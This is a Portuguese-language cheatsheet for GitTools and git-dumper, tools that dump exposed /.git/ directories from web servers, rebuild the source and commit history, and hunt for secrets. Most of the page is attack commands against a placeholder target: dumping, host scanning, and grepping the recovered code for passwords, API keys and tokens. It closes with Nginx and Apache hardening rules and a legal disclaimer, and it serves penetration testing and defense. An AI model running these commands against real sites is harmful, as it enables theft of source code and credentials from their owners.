<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📂 GitTools – Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="Segurança da Web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p alinhar="centro">
  <b>📂 Kit de ferramentas essencial para descobrir pastas <code>/.git/</code> expostas em servidores web, baixar armazenamentos de objetos Git brutos e reconstruir completamente o código-fonte original e o histórico de commits</b>
</p>

---

## 📋 Índice

- [Visão geral e o perigo .git exposto](#-overview--the-exposed-git-hazard)
- [Instalação](#-instalação)
- [Os três módulos GitTools](#-the-três-gittools-modules)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2. Extrator (`extractor.sh`)](#2-extrator-extratorsh)
  - [3. Localizador (`finder.py`)](#3-finder-finderpy)
- [Dumper Python alternativo: `git-dumper`](#-alternative-python-dumper-git-dumper)
- [Segredo pós-reconstrução e busca de credenciais](#-post-reconstruction-secret--credential-hunting)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e fortalecimento do servidor web](#-considerações defensivas--endurecimento do servidor web)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e o perigo .git exposto

Quando os desenvolvedores implantam aplicativos da web por meio de `git clone` ou scripts automatizados sem restringir adequadamente o acesso a diretórios ocultos, a pasta **`/.git/`** se torna acessível por HTTP/HTTPS:
`https://target.com/.git/`

Mesmo que a listagem de diretórios (indexação) esteja desabilitada, a estrutura determinística do Git permite que um invasor baixe `/.git/HEAD`, `/.git/config`, `/.git/index` e percorra todos os objetos soltos do Git (`.git/objects/xx/xxxx...`). Isso permite a reconstrução completa de:
- Código fonte completo do aplicativo e APIs internas.
- Credenciais de banco de dados, tokens de API e chaves SSH privadas em arquivos de configuração.
- Logs completos de commit do git, e-mails do autor e ramificações de desenvolvimento.

---

## 📥 Instalação
```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```
---

## 🚀 Os três módulos do GitTools

GitTools está organizado em três utilitários especializados:

### 1. Dumper (`gitdumper.sh`)
Baixa o máximo possível do diretório `.git` do servidor web:
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```
### 2. Extrator (`extractor.sh`)
Reconstrói arquivos originais, confirma árvores e ramificações a partir dos objetos soltos `.git` despejados:
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
Dentro do `/tmp/extracted_source/`, cada commit é restaurado em um diretório isolado contendo a árvore de arquivos completa naquele momento.

### 3. Localizador (`finder.py`)
Verifica listas de domínios ou blocos CIDR para detectar diretórios `.git` expostos:
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```
---

## 🐍 Dumper Python alternativo: `git-dumper`

`git-dumper` é uma alternativa Python multithread que reconstrói um repositório git ativo e funcional automaticamente em uma única etapa:
```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```
Depois de concluído, você pode usar comandos `git` normais dentro da pasta:
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```
---

## 🔍 Caça a segredos e credenciais pós-reconstrução

Assim que o repositório for recuperado, procure credenciais e arquivos ocultos:
```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Despejar com git-dumper (Python)**| `git-dumper https://target.com/.git/ ./repo/` |
| **Despejar com GitTools Bash** | `./Dumper/gitdumper.sh https://target.com/.git/ ./dump/` |
| **Extrair compromissos com a origem** | `./Extractor/extractor.sh ./dump/ ./source/` |
| **Verificar lista de hosts em busca de .git** | `python3 Finder/finder.py -i domains.txt` |
| **Ver histórico de commits** | `git log -p --color` |
| **Caça segredos codificados** | `gitleaks detect -v` |

---

## 🛡️ Considerações defensivas e proteção de servidor Web

1. **Endurecimento Nginx:**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Endurecimento Apache (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **Práticas recomendadas de CI/CD:** Nunca implante código clonando o git diretamente na raiz da web (`/var/www/html/`). Use pacotes de artefatos limpos ou contêineres do Docker.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> GitTools e git-dumper são projetados para avaliações de vulnerabilidades autorizadas e auditoria de infraestrutura defensiva. Baixar código-fonte proprietário de aplicativos da Web não autorizados sem permissão é ilegal.